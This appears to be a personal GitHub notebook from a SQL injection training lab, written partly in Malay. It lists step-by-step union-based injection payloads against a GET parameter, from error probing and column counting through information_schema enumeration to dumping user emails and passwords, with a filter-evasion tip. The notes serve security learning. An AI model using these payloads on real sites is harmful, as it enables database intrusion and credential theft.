# SQL-Injection-Training-Lab-notes
SQL Injection Training Lab notes for myself

## Level A - Basic GET SQL Injection
first payload for sqli `'` `"` `\` `)'` `}'` `\'` to test injectable

example page error after, use payload `'`

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/4e32639f-6c0e-4c82-bf67-317bc2ff01df)

if blind base does not have error

example page injectable and back to normal page after, use payload `'--+`
`--` komen untuk sql
`+` untuk space di url

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/417f7304-7b32-4688-8702-e50e97ce6bad)

payload `'+order+by+6--+` untuk cari berapa column yang ada dlm db, contoh sampai 6 dpt error bermaksud ada 5 colomn dlm db ini

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/728fa968-dfb5-4570-a786-c663f8b35833)

payload `?id=-1'+union+all+select+1,2,3,4,5--+` untuk tgk username dan email dikeluarkan berada di column no berapa, berdasarkan gambar bawah username terletak di col 2 dan email terletak di col 3, `2,3` boleh replace apa2 code contoh `@@version` untuk check version , `database()` untuk check nama db, `user()` untuk check username db. jika string union all select detect guna hex iaitu %61 atau no2 lain
 
![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/e68c2dec-1ada-4a95-82de-d3c84da608fc)

payload `?id=-1'+union+all+select+1,group_concat(table_name),3,4,5+from+information_schema.tables--+` untuk senaraikan semua db table dlm db information_schema

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/75903416-fec8-4ba8-b5a1-d6befaa5ec0f)

payload `?id=-1'+union+all+select+1,group_concat(table_name),3,4,5+from+information_schema.tables+where+table_schema=database()--+` untuk filter untuk current db sahaja mcm payload atas

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/c3f53df9-f9db-4f76-9c1c-a5f5fd80db56)

payload `?id=-1'+union+all+select+1,group_concat(column_name),3,4,5+from+information_schema.columns+where+table_schema=database()--+` untuk display semua jenis column untuk db 

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/5c3f8a18-58f9-450b-8b34-6744b7f72d59)

payload `?id=-1'+union+all+select+1,group_concat(column_name),3,4,5+from+information_schema.columns+where+table_schema=database()+and+table_name='users'--+` untuk display semua jenis column untuk db table users

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/20974b51-155d-44e1-b871-609104d9eebd)

payload `?id=-1'+union+all+select+1,group_concat(email),group_concat(password),4,5+from+users--+` untuk display email dan password sebab kita dah tahu table mana untuk guna

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/9dd9dab2-4e32-46bd-add4-1fe787a87b68)
